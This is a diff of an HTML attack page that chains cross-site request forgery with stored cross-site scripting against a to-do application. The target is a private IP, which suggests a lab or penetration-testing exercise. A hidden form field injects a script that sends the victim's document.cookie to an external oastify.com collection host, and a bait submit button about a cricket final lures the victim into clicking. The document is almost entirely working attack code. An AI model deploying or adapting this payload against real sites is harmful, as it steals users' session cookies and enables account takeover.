@@ -2,7 +2,8 @@
 <html>
   <body>
     <form id="csrfForm" action="http://192.168.1.115:8080/Todos/test/list.php" method="POST">
-      <input type="hidden" name="Todo" value="<img src='http://5gmyt5d1twwiopl6puuhh7rif9l09rxg.oastify.com?cookie='+document.cookie;>">
+      <input type="hidden" name="Todo" value="<script>window.location.href = 'http://5gmyt5d1twwiopl6puuhh7rif9l09rxg.oastify.com?cookie=' + encodeURIComponent(document.cookie);
+</script>">
       <input type="hidden" name="Status" value="Destroyed">
       <input type="submit" name="submit" value="Click here to make CSK to win the finale!!!">
     </form>
